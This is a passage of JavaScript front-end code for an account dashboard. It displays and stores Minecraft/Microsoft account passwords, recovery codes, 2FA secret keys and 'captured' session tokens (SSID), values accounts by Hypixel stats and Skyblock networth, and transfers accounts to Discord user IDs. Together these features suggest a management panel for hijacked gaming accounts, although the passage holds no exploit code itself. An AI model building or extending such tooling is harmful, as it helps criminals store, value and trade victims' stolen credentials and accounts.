                <div style="font-weight:600;font-family:var(--font-mono);font-size:0.75rem;word-break:break-all;margin-top:2px;">
                  ${acc.extra.ssid ? acc.extra.ssid.substring(0, 32) + '...' : 'None'}
                </div>
              </div>
            </div>
          ` : `
            <div style="text-align:center;padding:30px;color:var(--text-dim);">
              No extra metadata captured for this account.
            </div>
          `}
        </div>

        <!-- Tab 3: Hypixel Stats -->
        <div id="modal-tab-content-stats" style="display:none;">
          ${acc.stats ? `
            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
              <div class="stat-card" style="padding:14px;">
                <div class="stat-label">Bedwars Level</div>
                <div class="stat-value" style="font-size:1.3rem;">${acc.stats.bedwars?.level || 0}★</div>
                <div class="stat-sub">FKDR: ${acc.stats.bedwars?.fkdr || 0} | Wins: ${acc.stats.bedwars?.wins || 0}</div>
              </div>
              <div class="stat-card" style="padding:14px;">
                <div class="stat-label">Skywars Level</div>
                <div class="stat-value" style="font-size:1.3rem;">${acc.stats.skywars?.levels || 0}★</div>
                <div class="stat-sub">Kills: ${acc.stats.skywars?.kills || 0} | Wins: ${acc.stats.skywars?.wins || 0}</div>
              </div>
              <div class="stat-card" style="padding:14px;">
                <div class="stat-label">Duels Wins</div>
                <div class="stat-value" style="font-size:1.3rem;">${acc.stats.duels?.wins || 0}</div>
                <div class="stat-sub">WLR: ${acc.stats.duels?.WLRatio || 0}</div>
              </div>
              <div class="stat-card" style="padding:14px;">
                <div class="stat-label">Skyblock Networth</div>
                <div class="stat-value" style="font-size:1.3rem;color:#34d399;">
                  ${OverviewView.formatCoins(acc.stats.skyblock?.[0]?.networth || 0)}
                </div>
                <div class="stat-sub">${acc.stats.skyblock?.[0]?.cute_name || 'No Profile'}</div>
              </div>
            </div>
          ` : `
            <div style="text-align:center;padding:30px;color:var(--text-dim);">
              No Hypixel stats data stored for this account.
            </div>
          `}
        </div>
      `;

      Modal.open({
        title: `Account Inspector: ${acc.username}`,
        bodyHtml,
        footerHtml: `
          <button class="btn btn-secondary" onclick="Modal.close()">Close</button>
        `,
        maxWidth: '720px'
      });
    } catch (err) {
      Toasts.error('Failed to load account details: ' + err.message);
    }
  },

  switchModalTab(tabId) {
    ['creds', 'extra', 'stats'].forEach(t => {
      const btn = document.getElementById(`modal-tab-btn-${t}`);
      const content = document.getElementById(`modal-tab-content-${t}`);
      if (btn && content) {
        if (t === tabId) {
          btn.classList.add('active');
          content.style.display = 'block';
        } else {
          btn.classList.remove('active');
          content.style.display = 'none';
        }
      }
    });
  },

  openAddAccountModal() {
    const bodyHtml = `
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
        <div class="form-group">
          <label class="form-label">Minecraft Username</label>
          <input type="text" id="add-acc-username" class="form-input" placeholder="e.g. Steve" />
        </div>
        <div class="form-group">
          <label class="form-label">Email Address *</label>
          <input type="email" id="add-acc-email" class="form-input" placeholder="user@domain.com" required />
        </div>
        <div class="form-group">
          <label class="form-label">Password</label>
          <input type="text" id="add-acc-password" class="form-input" placeholder="Account password" />
        </div>
        <div class="form-group">
          <label class="form-label">25-Digit Recovery Code</label>
          <input type="text" id="add-acc-rec" class="form-input" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" />
        </div>
        <div class="form-group">
          <label class="form-label">Secondary Email</label>
          <input type="text" id="add-acc-sec" class="form-input" placeholder="backup@domain.com" />
        </div>
        <div class="form-group">
          <label class="form-label">Secret Key (2FA TOTP)</label>
          <input type="text" id="add-acc-key" class="form-input" placeholder="Secret Key" />
        </div>
        <div class="form-group">
          <label class="form-label">Owns MC</label>
          <select id="add-acc-mc" class="form-select">
            <option value="Purchased">Purchased</option>
            <option value="Xbox Game Pass">Game Pass</option>
            <option value="No MC">No MC</option>
          </select>
        </div>
        <div class="form-group">
          <label class="form-label">Capes</label>
          <input type="text" id="add-acc-capes" class="form-input" placeholder="e.g. Migrator, 15th Anniversary" />
        </div>
      </div>
    `;

    Modal.open({
      title: 'Add Manual Account Entry',
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="AccountsView.submitAddAccount()">Save Account</button>
      `
    });
  },

  async submitAddAccount() {
    const username = document.getElementById('add-acc-username').value;
    const email = document.getElementById('add-acc-email').value;
    const password = document.getElementById('add-acc-password').value;
    const recoverycode = document.getElementById('add-acc-rec').value;
    const secemail = document.getElementById('add-acc-sec').value;
    const secretkey = document.getElementById('add-acc-key').value;
    const ownsmc = document.getElementById('add-acc-mc').value;
    const capes = document.getElementById('add-acc-capes').value;

    if (!email) {
      Toasts.error('Email address is required');
      return;
    }

    try {
      await API.post('/api/accounts', {
        username, email, password, recoverycode, secemail, secretkey, ownsmc, capes
      });
      Modal.close();
      Toasts.success('Account registered successfully!');
      this.loadAccounts();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  openMoveModal(uid) {
    const bodyHtml = `
      <div class="form-group">
        <label class="form-label">Target Discord User ID</label>
        <input type="text" id="move-target-user-id" class="form-input" placeholder="Enter recipient Discord ID" />
      </div>
    `;

    Modal.open({
      title: `Transfer Account (${uid})`,
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="AccountsView.submitMoveAccount('${uid}')">Transfer</button>
      `
    });
  },

  async submitMoveAccount(uid) {
    const targetUserId = document.getElementById('move-target-user-id').value;
    if (!targetUserId) {
      Toasts.error('Target User ID required');
      return;
    }

    try {
      await API.post(`/api/accounts/${uid}/move`, { targetUserId });
      Modal.close();
      Toasts.success(`Account transferred to ${targetUserId}`);
      this.loadAccounts();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async deleteAccount(uid) {
    if (!confirm(`Are you sure you want to delete account ${uid}?`)) return;

    try {
      await API.delete(`/api/accounts/${uid}`);
      Toasts.success('Account deleted');
      this.loadAccounts();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async confirmDeleteAll() {
    if (!confirm('DANGER: Are you sure you want to delete ALL your accounts? This action cannot be reversed.')) return;

    try {
      await API.delete('/api/accounts');
      Toasts.success('All accounts deleted');
      this.loadAccounts();
    } catch (err) {
      Toasts.error(err.message);
    }
  }
};

window.AccountsView = AccountsView;
